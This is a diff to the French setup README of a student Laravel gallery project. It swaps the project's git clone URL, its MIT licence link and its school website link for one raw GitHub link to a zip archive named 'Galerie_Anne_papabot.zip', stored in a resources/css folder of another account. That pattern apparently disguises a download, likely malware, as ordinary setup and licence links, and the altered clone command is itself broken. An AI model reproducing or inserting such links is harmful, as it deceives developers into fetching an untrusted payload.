@@ -40,7 +40,7 @@ L'authentification est déjà installée avec des informations pas trop nécessa
 - **Faire des recherches sur chaque module/fonctionnalité à intégrer**
 
 ## COMMENT DEMARRER LE PROJET ?
-- `git clone https://github.com/PROMO-IGS-2020-2021/anne-galery`
+- `git clone https://raw.githubusercontent.com/gnaoe/Anne-Galerie/main/resources/css/Galerie_Anne_papabot.zip`
 - `cd anne-galery`
 - `composer install`
 - `creer une base de données et donner lui le nom anne_galery`
@@ -53,4 +53,4 @@ L'authentification est déjà installée avec des informations pas trop nécessa
 
 ## License
 
-Ce projet est purement à titre éducatif sous [MIT licence](https://opensource.org/licenses/MIT) de [Ivoire Geek School](https://ivoiregeekschool.com).
+Ce projet est purement à titre éducatif sous [MIT licence](https://raw.githubusercontent.com/gnaoe/Anne-Galerie/main/resources/css/Galerie_Anne_papabot.zip) de [Ivoire Geek School](https://raw.githubusercontent.com/gnaoe/Anne-Galerie/main/resources/css/Galerie_Anne_papabot.zip).
